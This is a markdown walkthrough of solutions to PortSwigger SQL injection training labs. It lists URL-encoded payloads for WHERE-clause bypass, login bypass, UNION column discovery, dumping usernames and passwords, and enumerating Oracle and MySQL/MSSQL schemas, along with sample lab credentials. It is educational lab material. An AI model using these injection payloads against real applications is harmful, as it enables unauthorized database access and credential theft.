# SQL-injection
# Port Swigger SQL injection Labs Solutions <tag>

<h3>- Retrieving hidden data</h3>

[1.Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)


1. *Solutions*
   1. `'+OR+1=1--` -> Required
   >The server can also respond for the following
   1. `'OR+'1'='1--`
   1. `'OR+'1'='1'--`
   1. `'OR+'1'--`
   1. `'OR+true--`
   1. `'OR+'a'='a'--`
   1. `/OR+1=1--`
   1. `)'OR+1=1-- `
   1. `""OR+1=1--`
   1. `)*OR+1=1--`
   
<h3>- Subverting application logic</h3>

[2.Lab: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

1. *Solutions*

   1. username : `administrator'--` password : `''`
   1. username :`a'OR+1=1--`        password : `''`
  
<h3>- Retrieving data from other database tables</h3>

[3.Lab: SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

1. *Solutions*

  The first step of such an attack is to determine the number of columns that are being returned by the query.
  The server will responed for `'ORDER+BY+1--` `'ORDER+BY+2--` `'ORDER+BY+3--` that mean there are 3 columns in the database.
   
   1. `'+UNION+SELECT+NULL,NULL,NULL-- `
   1. `'UNION+SELECT+NULL,NULL,NULL--`
   1. `'union+select+null,null,null--`
   
[4.Lab: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

1. *Solutions*

  The server responed for `'+UNION+SELECT+NULL,'xyz',NULL--` that is mean the second column containing text.
  Make the database retrieve the string: 'IyLLPT' #Noted in the top of the screen,it can be diffrent in your case
   
   1. `'+UNION+SELECT+NULL,'IyLLPT',NULL-- `
   
   
[5.Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

1. *Solutions*

  By applying `'+UNION+SELECT+NULL,NULL--` we can say the database has tow columns.
  By applying `'+UNION+SELECT+'abc','xyz'--` we can say the columns have string values.
  To retrieve the contents of the users table we can use the following payload
   `'+UNION+SELECT+username,+password+FROM+users--`
  where `username` is the name of first column ,`password` is the name of second column and `users` is the name of the table in the database.
  
   __Example__
   
   Database name :   USERS 
   
   username | password
------------ | -------------
administrator | bp6w7q9023goawolzuyh
Content in the first column | Content in the second column

 Now to solve the challenge go to Response in Burp Suite from raw search for `administrator` and its password `bp6w7q9023goawolzuyh`

[6.Lab: SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

1. *Solutions*

   By applying `'+UNION+SELECT+NULL,NULL--` we can say the database has tow columns.
   By applying `'+UNION+SELECT+NULL,'abc'--` we can say the second column has string values.
   Now to retrieve data from only one column we can use the following payload
   `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
   
  `||'~'||` will join `username and password` like  `administrator~wet39rb7kc6kt99lq0o6`
   
 Now to solve the challenge go to Response in Burp Suite and get the username~password `administrator~wet39rb7kc6kt99lq0o6`


<h3>- Examining the database in SQL injection attacks</h3>

[7.Lab: SQL injection attack, querying the database type and version on Oracle]()
 
1. *Solutions*

On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called DUAL which you can use for this purpose. For example: UNION SELECT 'abc' FROM DUAL 

   By applying `'+UNION+SELECT+NULL,NULL+FROM+DUAL--` we can say the database has tow columns.
   By applying `'+UNION+SELECT+'abc','xyz'+FROM+DUAL--` we can say the first and second columns have string values.
   to retrieve the version of the database, for Oracle we can use [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet):

   * SELECT banner FROM v$version
   * SELECT version FROM v$instance
   
   the payload will be like:
   
   `'+UNION+SELECT+banner,NULL+FROM+v$version--`
   
   `'+UNION+SELECT+version,NULL+FROM+v$instance--`
   
[8.Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft) 

 1. *Solutions*

   By applying `'+UNION+SELECT+NULL,NULL+FROM+DUAL#` we can say the database has tow columns.
   By applying `'+UNION+SELECT+'abc','xyz'+FROM+DUAL#` we can say the first and second columns have string values.
   Now to retrieve data from only one column we can use the following payload
   to retrieve the version of the database, for Microsoft DB we can use [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet):
   
   Microsoft	SELECT @@version
   
   the payload will be like:
   
   `'+UNION+SELECT+@@version,NULL+FROM+DUAL#`
   
   `'+UNION+SELECT+NULL,@@version+FROM+DUAL#`
   
[9.Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

 1. *Solutions*
 
   As we can see the Database respond for  `'+UNION+SELECT+NULL,NULL--` that is mean there are tow tables.
   
   By usin payload `'+UNION+SELECT+'abc','xyz'--` we can get that both tables have string values.
   
   use payload `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.columns-- ` to get table name `users_xxxx`
   
   use payload `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='USERS_ABCDEF'--` o retrieve the details of the columns in the table (replacing the table name) in my case is `users_ggighe` you can get that by search in bottom right filed in Burp Suite using `users`
   
   By using `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ggighe'--` you can see the user_xxxx and password_xxxx
    
   now change the column by user_xxx,password_xxxx.by using `'+UNION+SELECT+username_xxxx,+password_xxxx+FROM+users_xxxx--`
   then search by administrator and get the password
   
   Finally loging using administrator and its password
    
[10.Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

 1. *Solutions*
 
   Note that in Oracle every SELECT statement must specify a table to select FROM.
   
   There is a built-in table on Oracle called DUAL which you can use for this purpose. For example: UNION SELECT 'abc' FROM DUAL.
   
   By using `'+UNION+SELECT+'abc','xyz'+FROM+DUAL--` we can say the database has tow columns and both have string values.
   
   By using `'+UNION+SELECT+table_name,NULL+FROM+all_tables--` will get the name of the table.
   
   Then use `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_TJQMGZ'--` to retrieve the usename and password
   
   After you get the username and password use payload `'+UNION+SELECT+USERNAME_TZBHEF,PASSWORD_YAKDEJ+FROM+USERS_TJQMGZ--` to get username and password of the administrator
   
   Finally loging using administrator and its password
   
   
   

